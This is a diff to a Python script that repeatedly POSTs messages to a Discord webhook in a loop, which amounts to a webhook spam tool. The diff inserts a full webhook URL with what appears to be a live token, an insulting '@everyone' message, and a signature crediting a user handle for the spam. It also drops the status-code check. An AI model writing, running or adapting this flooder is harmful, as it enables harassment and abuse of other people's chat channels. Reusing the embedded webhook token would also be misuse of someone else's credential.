@@ -24,13 +24,13 @@ else:
 
 ### CONFIG ###
 
-webhook = "https://discord.com/api/webhooks/"
+webhook = "https://discord.com/api/webhooks/999983636218642443/eXS0rCyg1YCe3dj6lg6r2_uXp1EizoMnJEqsAUOllsWxUyFHwfL0Oxe7vENjjpyjizoo"
 data = {
     "content": "@everyone you bastards",
     "embeds": [
         {
             "title": "Spamming",
-            "description": "This webhook is getting spammed!"
+            "description": "This webhook is getting spammed! | Spam by zUnlegit#0396"
         }
     ],
     # "avatar_url": "https://cdn.discordapp.com/avatars/",
@@ -45,8 +45,5 @@ manysend = 0  # !LEAVE THIS!
 while howmany > 0:
     r = requests.post(url=webhook, json=data)
     manysend += 1
-    if r.status_code == 200 or 204:
-        print(f"[+] Status Code: {r.status_code} | Message send! | Message: {manysend}")
-    else:
-        print(f"[-] Status Code: {r.status_code} | Message not send | Message: {manysend} | Any error")
+    print(f"[!] Status Code: {r.status_code} | Message: {manysend}")
     howmany -= 1
